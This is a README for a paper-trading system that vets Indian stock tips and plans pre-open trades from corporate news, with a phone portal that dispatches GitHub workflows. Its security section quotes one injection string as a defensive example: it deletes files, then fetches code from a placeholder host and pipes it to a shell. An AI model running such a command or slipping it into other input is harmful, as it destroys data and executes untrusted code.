# stock-tips-system

Two desks in one repo, both unattended, both driveable from a portal on your phone.

**The positional desk** gathers Indian stock tips from cluttered public sources, vets them with its own
technical analysis, gives each an exact entry, stop-loss and three stepped targets **with a date on each
target**, scores every tipster by what they actually delivered, and paper-trades ₹1,00,000 in rotation.

**The intraday desk** reads overnight corporate news — order wins, L1 calls, approvals — works out which
listed name actually trades on it, measures the event against that company's own annual revenue, and puts
a plan on the page **before the market opens**. Its plan is a rule about the gap rather than an entry
price, because a stock that opens +9% and one that opens +1% are not the same trade.

**Status: paper trading.** Nothing here places real orders. The point of the first months is to build a track record you can trust (`state/ledger.json`, `state/sources_confidence.json`) before any broker integration.

## How a day works

Two clocks. The news desk runs before the open and inside the session; the positional desk runs on the
open and after the close.

```
08:00  preopen      overnight wires → events → beneficiaries → catalyst → THE EMAIL
08:15  morning      the tip pipeline: gather → analyse → pick → paper allocation
09:35  intraday     the real gap and opening range; trigger, stand aside, or void
15:20  intraday --close   settle at what the tape gave, then grade every event class
15:45  eod          mark the positional book to market, grade the tip sources
```

```
08:15 IST  morning run                         15:45 IST  EOD run
┌──────────────────────────────┐               ┌──────────────────────────────┐
│ gather   sources.yaml →      │               │ eod      fill pendings @open │
│          Google News, ET,    │               │          walk today's bar:   │
│          Moneycontrol, Mint, │               │          SL / T1 / T2 / T3   │
│          brokerages, Chartink│               │          time stops → exit   │
│          scans, Telegram     │               │          or HOLD bucket      │
│ review   Claude fixes what   │               │ learn    source confidence   │
│          regexes flagged     │               │          ± per outcome,      │
│ analyze  TA on daily chart → │               │          pattern stats,      │
│          plan (entry/SL/T1-3)│               │          lessons.md          │
│          + fundamentals +    │               │ review   Claude writes the   │
│          source weight →     │               │          honest attribution  │
│          composite, verdict  │               │ push     reports/<date>/     │
│ pick     confidence-weighted │               │          eod.md, dashboard   │
│          paper allocation    │               └──────────────────────────────┘
│ push     reports/<date>/     │
│          morning.md → notify │
└──────────────────────────────┘
```

Deterministic Python does everything that must be reproducible (fetching, TA maths, ledger, scoring). The Claude layer in the scheduled run does what regexes can't: reading messy articles, rejecting non-tips, sanity-checking the top candidates against news, and writing one honest paragraph of attribution each evening. Both layers write to the same git repo, so every decision is versioned.

## Layout

```
config/settings.yaml     every rule: capital, mandate (5%/10%), risk caps, stepped exits, scoring weights, confidence dynamics
config/sources.yaml      the tip source registry (add a source = add a YAML block; confidence starts at 0)
config/news_sources.yaml the corporate-news wires for the pre-open run (kept apart from the tip sources)
config/themes.yaml       who actually trades on a piece of news — 13 themes, 66 NSE names, cost-per-unit rules
config/holidays.yaml     NSE holidays (verify each December)
state/                   the brain — committed on every run
  ledger.json            paper positions, closed trades, equity curve
  sources_confidence.json per-source score / hit-rates / expectancy / auto-disable
  lessons.md             machine + analyst lessons, appended daily
  actions_log.json       the last 20 commands the portal ran, with their output
  price_cache.json       last 60 closes per symbol, for the portal's charts (market data, not a record)
  daybook.json           the intraday day book — paper trades opened and closed inside one session
  event_classes.json     what each kind of news has actually been worth (open→high, per class)
  universe_cache.json    NSE symbol master (weekly refresh, seed in data/EQUITY_L.csv)
reports/<date>/          tips_raw.json → tips_reviewed.json → tips_structured.json → analysis.json → picks.json → morning.md / eod.md
prompts/                 analyst_persona.md (loaded every run) + the scheduled-task playbooks:
                         morning_run.md, eod_run.md, preopen_run.md, session_run.md
docs/                    the portal (GitHub Pages): index.html + data.json + manifest — five tabs, and every CLI command as a button
.github/workflows/       desk.yml — the workflow the portal dispatches to run a command and commit the result
scripts/                 desk_command.py (env → argv, no shell), record_run.py (the visible action log)
src/stocktips/           the package — data/, sources/, analysis/, portfolio/, learning/, pipeline.py, report.py, cli.py
tests/                   ledger lifecycle, extraction, plan geometry, the Mojo importer, the dispatch bridge (no network)
```

## Running it by hand

```bash
pip install -r requirements.txt
export PYTHONPATH=src
python -m stocktips morning --no-book      # full dry run, nothing booked
python -m stocktips morning                # books paper positions (fills at next open)
python -m stocktips eod                    # after 15:30 IST
python -m stocktips status
python -m stocktips book CGPOWER           # formalise one analysed suggestion into a tracked paper position
python -m stocktips book CGPOWER --capital 25000   # ...with an explicit allocation
python -m stocktips close CGPOWER          # discretionary exit: cancel a pending position, or sell an open one
python -m stocktips capital --add 50000    # move the capital base (recorded as a dated ledger event)
python -m stocktips add-tip --source manual:mohan --symbol TATASTEEL \
       --target "195,210" --stop 168 --timeframe monthly --text "<the original message>"
python -m stocktips import-tips --file mojo-paste.txt --dry-run   # read a Markets Mojo paste, write nothing
python -m stocktips import-tips --file mojo-paste.txt             # ...and log every call it resolved
pbpaste | python -m stocktips import-tips --source mojo           # or straight off the clipboard
python -m stocktips contenders --top 3     # rank today's ideas head to head, with each tipster's claim beside our plan
python -m stocktips preopen --refresh      # 08:00: overnight corporate news → catalyst scores → preopen.md (the email)
python -m stocktips intraday               # the session check: the real gap, the real opening range
python -m stocktips intraday --close       # settle the day at what the tape gave, then grade the news
python -m stocktips daybook                # the intraday record, and what each kind of news has been worth
python -m stocktips analyze-symbol TATASTEEL --tf weekly
python -m stocktips add-source --kind telegram --id tg_foo --channel foo --name "Telegram — @foo"
python -m stocktips lesson "Breakouts on 1.5x volume kept failing in a falling Nifty — require Nifty > 20EMA for breakout picks."
python -m pytest -q tests
```

## The scoring, in one paragraph

Every candidate gets three independent 0–100 numbers. **TA confidence** starts at 40 and earns/loses points for trend regime (EMA 20/50/200 stack), RSI zone, MACD slope, ADX, volume vs 20-day average, named patterns (60-day breakout on volume, pullback to 20-EMA in an uptrend, Bollinger squeeze, double bottom), reward:risk to T2, and kill-switches (overextended, gap day, illiquid, stop too wide, target below mandate). **Fundamentals** starts at 50 and moves with ROCE/ROE, P/E, 3-year sales and profit CAGR, debt/equity, promoter holding and its trend, pledges, last-quarter PAT and market cap (Screener.in). **Source confidence** is 50 for an untested source and moves with realised outcomes: +10 for T1, +5 each for T2/T3, −15 for a stop-loss, −6 for a losing time stop, with 5% decay per outcome so a source can redeem itself; a source with ≥ 8 outcomes and score < −40 is auto-disabled. Composite = 0.5·TA + 0.2·Fund + 0.3·Source; ≥ 65 BUY, ≥ 78 STRONG BUY. Capital is split across the top 3 in proportion to conviction above the threshold, capped at 50% per name.

## Targets and stops

Stops go a hair below the nearest qualifying swing support (≥ 0.6 ATR away, ≤ 8%), else 1.5 ATR (weekly) / 2.5 ATR (monthly). Targets go to successive swing resistances when one sits in the expected band, else 1.5 / 3 / 4.5 ATR (weekly) or 3 / 5 / 8 ATR (monthly); the 52-week high is a natural T3 when it is in reach. Exits are stepped 40/30/30 with the stop trailing to breakeven after T1 and to T1 after T2. A weekly idea that hasn't hit T1 in 10 trading days (30 for monthly) is time-stopped: exited if the fundamentals score is < 65 ("hot potato"), parked in the HOLD bucket if ≥ 65.

## The portal

`docs/index.html` is one self-contained page — vanilla JS, Chart.js from cdnjs, Manrope and JetBrains
Mono from Google Fonts — reading `docs/data.json`. Six tabs, light by default, installable to a phone
home screen, and everything the CLI can do is a button on it.

```
The book    positions with a 60-session price chart, the plan drawn across it, and a target ladder
Intraday    today's news candidates, the gap ladder drawn, and what each kind of news has been worth
Ideas       the final 3 head to head, then every BUY-grade name, sorted by which should pay first
Journal     equity curve, closed trades, capital flows, the lessons file
Sources     the confidence table — what each tipster has actually earned
Console     connect GitHub, import Markets Mojo, run the pipeline, paste a tip, move capital, log a lesson
```

### Markets Mojo, pasted

Mojo's calls arrive as text — either the whole calls table off the screen, or one call's detail
panel. Paste either into **Console → Import from Markets Mojo** and the page says what it read
before anything is dispatched: how many calls, which are Buy, which are Sell, and the three numbers
each one claims. Press Import and `stocktips import-tips` does the real work:

* both paste shapes are read into one record — `src/stocktips/sources/mojo.py`;
* names are matched against the NSE master **offline**, which matters because Mojo truncates them to
  fit its column (`Motil.Oswal.Fin.` → `MOTILALOFS`, `Container Corpn.` → `CONCOR`,
  `Firstsour.Solu.` → `FSL`). A name that could be two companies comes back **unresolved with its
  candidates** rather than guessed, and the run says which rows need a person;
* their entry, target and stop are filed as *claims* (`src_entry`, `src_targets`, `src_stop`), never
  as levels. `build_plan` reads the chart;
* a **Sell** call is recognised as a short — including a row labelled Buy whose target sits below its
  entry, where the arithmetic wins over the label. It is still logged, so Mojo gets graded on it,
  but `structure` drops non-buy calls and this desk never books a short;
* `mojo` starts at confidence 0 like every other source and earns its weight from outcomes.

Then **Re-analyse** and look at the final 3.

### The final 3

`analyze` scores every idea on its own merits, which leaves a long list. `contenders` ranks them
against each other and names the few worth the next rupee:

```
composite                       chart + business + how well that source has actually done
+10 → -10   the clock           sessions the chart's own drift needs to reach T1, against the time stop
                                (-8 when there is no measurable drift, so T1 has no date on it)
 +0 → +6    momentum            the drift it is actually running at, not the target someone wants
 +4 each    corroboration       a second independent source on the same name, capped at two
   -4       claim stretch       a tipster asking for more than half again what the chart offers
```

Each contender is drawn with **They said** beside **This desk** — entry, target, stop, upside, risk —
so the divergence is on the page rather than in someone's head, with a line naming it: their target
landing inside our ladder, above our T3, or their stop being the looser of the two. `stocktips
contenders --top 3` prints the same thing.

### When each target should land

Three targets with no dates are three hopes, so every level carries an estimate in trading sessions,
derived from how the stock actually travels:

| | |
|---|---|
| `amplitude_pct_day` | the median absolute daily move — the distance a session usually covers |
| `efficiency` | Kaufman's ratio: net move ÷ sum of the individual moves. 1.0 is a straight line, 0.1 is chop that ends where it began |
| `drift_pct_day` | their product — the net progress a session is worth in the trend's direction |
| `eta_days` | `target_pct ÷ drift`, capped at three clocks |
| `momentum_score` | 0–100 from the drift, so the fast movers sort to the top |

A ±2%/day stock that ends the month where it started scores 0.06 efficiency and a drift near zero; a
clean 0.8%/day trend scores 1.0 and 0.8. Same daily amplitude, opposite verdict — which is the whole
point, because the first one will never reach its target inside a 10-session clock.

The plan scores that too: **+6** when T1 sits well inside the time stop, **−10** when the pace cannot
get there. Right direction, wrong clock is the most common way a good-looking idea dies.

Positions carry their entry-time ETA, so the book can say *"session 14 of the ~9 its pace needed"* and
flag a trade running late before the clock does.

### Tags

Derived from the numbers, each carrying its evidence in the tooltip: **Fundamentals** / **Sound books**,
**Chart** / **Clean chart**, **Fast mover**, **Asymmetric**, **Tight stop**, **N sources**,
**Strong uptrend** — and the warnings: **Weak books**, **Sluggish**, **Beats the clock?**,
**Hot potato**. Filter the Ideas tab by them.

### The buttons actually run the system

GitHub Pages is static, so the page asks GitHub to do the work:

```
browser  ──dispatch──▶  .github/workflows/desk.yml  ──▶  scripts/desk_command.py
                                                            │
                                              python -m stocktips <command>
                                                            │
                          commit to main ◀── dashboard-data ─┘ ── state/actions_log.json
                                │
                          Pages redeploys ──▶ the page re-reads data.json and re-renders
```

Paste a fine-grained token (scoped to this one repository, **Contents: read and write** +
**Actions: read and write**) into Console → Connection. It is kept in that browser's localStorage and
sent only to `api.github.com`. Then **Take**, **Exit**, **Cancel**, **Deposit**, **Withdraw**,
**Log a tip**, **Lesson**, and the whole pipeline — `morning`, `eod`, `analyze`, `pick`,
`dashboard-data` — all run from the page, and it refreshes itself when the run lands.

Without a token every button still works: it queues the intent locally and hands you the CLI line.

**Browser input never reaches a shell.** `scripts/desk_command.py` maps environment variables onto an
argv list against a fixed spec, so a `--note` of `"; rm -rf / && curl evil.sh | sh #"` is one string
argument and stays one. Commands outside the spec, missing required inputs, and flags a command does
not accept are all refused before anything runs. Nothing a browser sends is interpolated into a
`run:` block either — every use goes through `env:` and is quoted, which a test asserts. Since
`workflow_dispatch` allows only ten inputs and the desk has more fields than that, the common ones
are named and the rest ride along as JSON in `args`; those keys can never overwrite a named input,
so a check on `symbol` cannot be passed and then quietly re-pointed. `scripts/record_run.py` appends every run to
`state/actions_log.json`, so the last twenty actions are visible on the page with no token at all.

### Capital and the honest return

`capital.total_inr` in settings.yaml only *seeds* a new ledger. After that `capital_inr` in
`state/ledger.json` is the live base, moved only by `stocktips capital`, which appends a dated entry to
`cash_flows`. Every percentage rule — 50% per stock, the 15% minimum position — is a percentage of that
live base, so a top-up widens them.

Return is **time-weighted**: each sub-period of the equity curve is chained against its own opening
base, where the base is the previous close plus whatever capital arrived since. Without that, adding
₹50,000 to a ₹1,00,000 book would read as a +50% day and every later number would be measured against
the wrong base.

### Discretionary exits

The plan's own exits — stop, stepped targets, time stop — run in the evening without you. `close` is
for the other case: freeing capital because a better idea arrived. A **pending** position was never
filled, so it is cancelled and its capital returned, and no outcome is attributed to the source —
nothing happened. An **open** or **hold** position sells at the last close (or `--price`) and is
recorded as `manual_exit`: the realised return counts towards the source's expectancy, but its score is
left alone, because the tip did not resolve — it was pre-empted.

## The intraday desk

On 7 September 2026 Power Grid named **GE Vernova T&D India** L1 bidder for a 6,000 MW HVDC terminal
station at Barmer. The announcement carried a capacity and no rupee value. The stock rose 7.4% that
day; on the 8th Nomura put the contract at ₹12,980 crore and it ran to about +12% before closing near
+9%. The desk owner read the story mid-morning on the 8th, after the move.

That was a timing loss, not an analysis loss — and the whole of this half of the repo exists to turn
it into a page on the desk at 08:00.

### The signal has a clock

```
15:30 IST ─────────── overnight ─────────── 09:15 IST ────── session ────── 15:30 IST
           ▲ the whole move is still ahead of you        ▲ you are chasing
```

An order win on the wire at 19:40 is a gift. The same story republished at 11:00 the next day looks
identical in an RSS feed and is a trap. Freshness is therefore not a tiebreaker in the score, it is
most of the score.

### Four problems the tip pipeline does not solve

**Events, not recommendations.** `sources/events.py` looks for who, what happened, how big and how
sure, across 17 classes — including the negative ones, because *do not buy this today and exit it if
you hold it* is also actionable. "Emerges as L1 bidder" is its own class: in Indian PSU tendering it
converts almost always, so it carries 80% certainty rather than being read as a signed order.

**The named company is usually not the tradable one.** The headline says *Power Grid secures the
project*, and POWERGRID is too large to move on its own capex. `config/themes.yaml` maps the event's
vocabulary to the names that supply the thing, each with a directness weight and a one-line reason you
can disagree with. Its `buyers` list stops the awarding party being read as the beneficiary of its own
spending. And a story with a named winner is not a story about the whole theme — GE Vernova won that
bid and Hitachi Energy did not, so theme peers are demoted to *sympathy* weight rather than emitted as
equals.

**Size is usually absent, and always relative.** That filing gave a capacity, so the hvdc theme's
cost-per-unit rule turned 6,000 MW into ≈₹12,600cr — 2.9% off Nomura's number, from the capacity
alone. What then matters is the ratio: **₹13,000cr against ₹3,900cr of revenue is 3.3 years of sales
in one letter.** The same order at Larsen & Toubro would be a rounding error. Note also that the
biggest number in an article is usually the wrong one — that story carries both the ₹12,980cr contract
and the ₹26,000cr *project* capex, and the supplier only books the first — so amounts are ranked by
the words they sit beside, not by size.

**A good story on a bad chart is still a bad trade.** Fundamentals gate it, the daily chart
contextualises it, and liquidity vetoes it outright: below ₹5cr of daily turnover the position cannot
be exited at the price the plan assumes.

### The catalyst score

Additive, every term carrying its reason in words, so the email explains itself:

```
event class      order win +30 · L1 bidder +24 · approval +26 · earnings beat +22 · MoU +12
                 and the negatives: raid −22 · order cancelled −24 · QIP −16 · pledge −18
materiality      ≥1× revenue +26 · ½–1× +18 · ¼–½× +12 · <10% +2 · unknown 0, and it says so
fundamentals     ≥70 +10 · 50–69 +4 · <40 −10
the chart        near the 52w high on volume +8 · below the 200-day −6 · already ran >6% −14
freshness        overnight +12 · during yesterday's session −8 · older than 36h −20
corroboration    a second independent wire +3 each, capped
liquidity        under ₹5cr a day — a veto, not a penalty
```

`TRADE` at 62, `WATCH` at 45, `AVOID` for the negative classes.

### The plan that stops you buying the top

Never "buy it" — a rule keyed on what the open actually does:

```
gap ≤ +2%      buy the break of the first 15-minute high; stop under its low
gap +2 to +5%  the same, but only if that range closes in its top third on >3× normal volume
gap > +5%      NO fresh entry at the open. A pullback that reclaims VWAP, or nothing.
```

The third line is the discipline. Targets are measured moves of the opening range, capped at 1.5× the
daily ATR, because a +15% target on a stock that travels 3% a day is arithmetic and not a plan. The
stop is never wider than 1.5%, the position is sized by the risk budget rather than the cash, and
everything is flat by 15:10. The day book (`state/daybook.json`) is deliberately separate from the
positional ledger: an equity curve means nothing if half its entries are round trips inside one bar
of the other half.

### Training it

At 15:20 every candidate is graded on how far it travelled from the open — **whether or not a plan
ever triggered**, because a story that moved a stock 4% is evidence about that class of news either
way. One story that moves four related names counts once, using the most direct beneficiary; four
would let a single afternoon define a class.

Those outcomes move two sets of weights, with the decay the tip sources already use:

* **the news wire** — some are reliably early and some reprint yesterday's move with a new dateline;
* **the event class** — the priors above are estimates written in one evening. `prior + adjust` is
  what the scorer actually uses, and evidence can halve or double a class but never invert its sign.
  The Intraday tab shows that table, so "analyst upgrade · 14 graded · 0% moved · weight 0 (−10)" is
  visible rather than buried.

There is no model to fit. It is an honest ledger of what each kind of news was worth, kept in git.

### Does this need a server?

Not yet, and `notes/intraday-design.md` sets out why in full. The product is an email at 08:00 and a
page showing the plan and how it went; a routine sends the email and a static page reads a committed
JSON. Three things would force a move, and only these three: reacting inside 90 seconds of the wire
(a different strategy, not a faster one), live quotes in the page during the session rather than the
last committed check, or placing real orders — which needs a vault for a broker key, and stops this
being paper trading.

## Adding sources

The system is only as good as its inputs. Kinds implemented: `gnews` (Google News RSS query, any publisher), `page` (a listing page), `rss`, `chartink` (a scan clause — system-generated candidates), `telegram` (public channel via `t.me/s/`). Planned: `youtube` (transcripts), `x`. Brokerages and named analysts found *inside* articles become sub-sources (`broker:motilal`, `broker:bagadia`) and are scored separately from the paper that carried the call.

## Going live (later)

Only when the paper ledger shows a positive expectancy over a meaningful sample. The natural path is Zerodha Kite Connect (`kiteconnect` Python SDK): the morning run would place CNC limit orders at the entry zone with a GTT OCO for stop and T1, and the EOD run would reconcile fills against the ledger. That layer is intentionally absent from this repo today.

_Not investment advice. Paper trading only._
